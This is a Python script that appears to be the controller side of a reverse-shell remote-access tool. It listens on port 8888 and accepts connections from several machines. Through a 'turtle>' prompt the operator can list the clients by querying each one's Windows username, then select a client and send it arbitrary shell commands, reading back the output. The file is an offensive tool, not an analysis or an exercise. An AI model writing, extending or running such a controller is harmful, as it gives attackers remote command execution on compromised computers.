import socket
import threading
import sys
import time
from queue import Queue
TOTAL_Threads = 2
NUMBER_OF_THREADS =[1,2]
all_connections = []
all_addresses = []
queue = Queue()
def create_socket():
    try:
        global server
        global host
        global port
        host=''
        port=8888
        server = socket.socket()
    except socket.error as err:
        print(f'this error occured in create_socket{err}')

def bind_socket():
    try:
        server.bind((host, port))
        server.listen(5)
    except socket.error as msg:
        print('error in binging socket retrying....',msg)
        bind_socket()
def acceptConnections():
    for i in all_connections:
        i.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn,addr = server.accept()
            server.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(addr)
            conn.send(' '.encode('utf-8'))
            print('waiting for connections...')
            print(f'client has been connected with this ip address and port {addr}')
        except Exception as err:
            print('an error occurred during acceptConnections retrying ....',err)

def get_username(conn):
    conn.send('echo %username%'.encode('utf-8'))
    result = conn.recv(4026).decode('utf-8')
    return result
select = False
def turtle():
    while True:
        try:
            cmd = input('turtle> ')
            if cmd == 'quit':
                sys.exit('connection cloased')
            if cmd == 'list':
                count = 0
                all = list_connections()
                for k,v in all.items():
                    print(f'{count} client {k} is connected with {v}')
                    count += 1
            elif 'select' in cmd:
                send_selected_commands(cmd)
            else:
                print('command cannot be recognised')
        except Exception as err:
            print('an error occurred ',err)
def send_selected_commands(cmd):
    cmd = cmd.replace('select ','')
    conn = all_connections[int(cmd)]
    ind = all_connections.index(conn)
    addr = all_addresses[ind][0]
    while True:
        command = input(addr+'>')
        if command == 'quit':
            print('connection cloased')
            break
        conn.send(command.encode('utf-8'))
        print(conn.recv(20090).decode())
def list_connections():
    all = {}
    for k in all_addresses:
        ind = all_addresses.index(k)
        conn = all_connections[ind]
        user = get_username(conn)
        all[user]=k
    return all
def create_thread():
    for _ in NUMBER_OF_THREADS:
        thread = threading.Thread(target=assign_jobs)
        thread.daemon = True
        thread.start()

def assign_jobs():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            acceptConnections()
        if x == 2:
            turtle()

        queue.task_done()

def create_jobs():
    for x in NUMBER_OF_THREADS:
        queue.put(x)

    queue.join()


create_thread()
create_jobs()